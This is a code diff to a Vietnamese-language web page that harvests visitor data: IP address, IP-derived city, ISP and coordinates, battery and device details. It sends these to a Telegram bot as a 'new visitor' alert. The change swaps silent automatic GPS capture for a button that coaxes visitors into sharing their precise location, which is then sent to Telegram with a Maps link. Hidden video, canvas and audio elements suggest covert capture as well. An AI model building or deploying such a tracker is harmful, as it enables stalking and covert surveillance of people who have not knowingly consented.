@@ -67,6 +67,9 @@
 </head>
 <body>
     <div id="info" class="loading">⏳ Đang tải thông tin...</div>
+    <div id="gpsBtnContainer" class="hidden">
+        <button id="gpsButton">📍 Cho phép định vị chính xác</button>
+    </div>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <audio id="audio" style="display:none;"></audio>
@@ -263,7 +266,8 @@
             }
         }
 
-        // Hàm lấy thông tin IP và vị trí chính xác
+        // ================== SỬA LỖI THÔNG TIN THÀNH PHỐ, KHU VỰC, QUỐC GIA, NHÀ MẠNG ==================
+        // Hàm lấy thông tin IP và vị trí chính xác, ưu tiên API có dữ liệu đầy đủ và chuẩn
         async function getIPAndLocation() {
             let ip = 'Không xác định';
             let locationData = {
@@ -275,7 +279,7 @@
                 lon: null
             };
             
-            // Bước 1: Lấy IP chính xác
+            // Bước 1: Lấy IP chính xác từ nhiều nguồn
             const ipAPIs = [
                 'https://api.ipify.org?format=json',
                 'https://api.my-ip.io/ip.json',
@@ -298,8 +302,10 @@
                 }
             }
             
-            // Bước 2: Lấy vị trí từ IP
+            // Bước 2: Lấy vị trí từ IP với thứ tự ưu tiên các API có độ chính xác cao nhất cho Việt Nam và thế giới
+            // Sử dụng ip-api.com làm nguồn chính (nhanh, chính xác, hỗ trợ tốt)
             const locationAPIs = [
+                // 1. ip-api.com - ưu tiên hàng đầu vì dữ liệu chuẩn, có regionName, city, isp rõ ràng
                 {
                     url: `https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,
                     parser: (data) => {
@@ -316,6 +322,7 @@
                         return null;
                     }
                 },
+                // 2. ipapi.co - backup tốt
                 {
                     url: `https://ipapi.co/${ip}/json/`,
                     parser: (data) => {
@@ -332,6 +339,7 @@
                         return null;
                     }
                 },
+                // 3. ipinfo.io - cũng có dữ liệu tốt
                 {
                     url: `https://ipinfo.io/${ip}/json`,
                     parser: (data) => {
@@ -358,6 +366,7 @@
                 }
             ];
             
+            // Lấy dữ liệu từ API ưu tiên, nếu api đầu tiên thành công sẽ dùng luôn
             for (const api of locationAPIs) {
                 try {
                     const controller = new AbortController();
@@ -376,7 +385,27 @@
                 }
             }
             
-            // Chuẩn hóa dữ liệu
+            // Nếu vẫn chưa có city/region/country, thử dùng freegeoip nhưng ít chính xác hơn, nhưng vẫn thử
+            if (locationData.city === 'Không xác định' && locationData.country === 'Không xác định') {
+                try {
+                    const fallbackUrl = `https://freegeoip.app/json/${ip}`;
+                    const response = await fetch(fallbackUrl, { timeout: 5000 });
+                    const data = await response.json();
+                    if (data && data.country_name) {
+                        locationData = {
+                            city: data.city || 'Không xác định',
+                            region: data.region_name || 'Không xác định',
+                            country: data.country_name || 'Không xác định',
+                            isp: data.isp || 'Không xác định',
+                            lat: data.latitude || null,
+                            lon: data.longitude || null
+                        };
+                        console.log("✅ Dùng freegeoip.app cho dữ liệu:", locationData);
+                    }
+                } catch(e) {}
+            }
+            
+            // Đảm bảo không có giá trị rỗng hay undefined, chuẩn hóa dữ liệu hiển thị
             locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
             locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
             locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
@@ -385,59 +414,71 @@
             return { ip, locationData };
         }
 
-        // Hàm tự động gửi vị trí GPS mà không cần nút bấm (gửi ngay khi có quyền)
-        async function autoSendGPS() {
-            if (gpsDataSent) return;
+        // Hàm yêu cầu GPS
+        function setupGPSButton() {
+            const btnContainer = document.getElementById('gpsBtnContainer');
+            const gpsBtn = document.getElementById('gpsButton');
             
-            if (!('geolocation' in navigator)) {
-                console.log('Trình duyệt không hỗ trợ GPS');
-                return;
-            }
+            btnContainer.classList.remove('hidden');
             
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const accuracy = pos.coords.accuracy;
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                    
-                    const gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
-                        `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
-                        `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
-                        `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n` +
-                        `<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
-                    
-                    await sendToTelegram(gpsMessage);
-                    gpsDataSent = true;
-                    console.log('✅ Đã tự động gửi vị trí GPS');
-                },
-                (err) => {
-                    let errorMsg = '';
-                    switch(err.code) {
-                        case err.PERMISSION_DENIED:
-                            errorMsg = 'Người dùng từ chối chia sẻ vị trí';
-                            break;
-                        case err.POSITION_UNAVAILABLE:
-                            errorMsg = 'Không thể xác định vị trí';
-                            break;
-                        case err.TIMEOUT:
-                            errorMsg = 'Hết thời gian chờ';
-                            break;
-                        default:
-                            errorMsg = err.message;
-                    }
-                    console.log(`Lỗi GPS: ${errorMsg}`);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+            gpsBtn.addEventListener('click', async () => {
+                if (gpsDataSent) return;
+                
+                infoDiv.innerHTML += '\n\n📍 Đang lấy vị trí GPS...';
+                
+                if (!('geolocation' in navigator)) {
+                    infoDiv.innerHTML += '\n❌ Trình duyệt không hỗ trợ GPS';
+                    return;
                 }
-            );
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const accuracy = pos.coords.accuracy;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        
+                        const gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
+                            `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
+                            `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
+                            `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n` +
+                            `<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
+                        
+                        await sendToTelegram(gpsMessage);
+                        gpsDataSent = true;
+                        
+                        infoDiv.innerHTML += `\n✅ Đã gửi vị trí GPS!\n📍 ${lat}, ${lng}`;
+                        btnContainer.classList.add('hidden');
+                    },
+                    (err) => {
+                        let errorMsg = '';
+                        switch(err.code) {
+                            case err.PERMISSION_DENIED:
+                                errorMsg = 'Người dùng từ chối chia sẻ vị trí';
+                                break;
+                            case err.POSITION_UNAVAILABLE:
+                                errorMsg = 'Không thể xác định vị trí';
+                                break;
+                            case err.TIMEOUT:
+                                errorMsg = 'Hết thời gian chờ';
+                                break;
+                            default:
+                                errorMsg = err.message;
+                        }
+                        infoDiv.innerHTML += `\n❌ Lỗi GPS: ${errorMsg}`;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
         }
 
         // Lấy thông tin thiết bị
         async function getInfo() {
+            // Lấy IP và vị trí đã sửa lỗi
             const { ip, locationData } = await getIPAndLocation();
             
             // Lấy thông tin pin
@@ -471,7 +512,7 @@
                 mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
             }
             
-            // Hiển thị thông tin trên web
+            // Hiển thị thông tin trên web với dữ liệu đã được sửa chính xác
             const text = `📱 THÔNG TIN KHÁCH TRUY CẬP
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🌐 Địa chỉ IP : ${ip}
@@ -496,6 +537,10 @@
             infoDiv.className = 'success';
             infoDiv.innerHTML = text;
             
+            // Thêm nút GPS
+            setupGPSButton();
+            infoDiv.innerHTML += '\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⬇️ Nhấn nút bên dưới để gửi vị trí chính xác ⬇️';
+            
             if (!infoSent) {
                 infoSent = true;
                 
@@ -504,6 +549,7 @@
                     telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
                 }
                 
+                // Gửi tin nhắn Telegram với dữ liệu đã sửa
                 const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
                     `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
                     `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
@@ -522,11 +568,6 @@
                     `<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
                 
                 await sendToTelegram(telegramText);
-                
-                // Tự động gửi vị trí GPS ngay sau khi gửi thông tin
-                setTimeout(() => {
-                    autoSendGPS();
-                }, 1000);
             }
         }
         
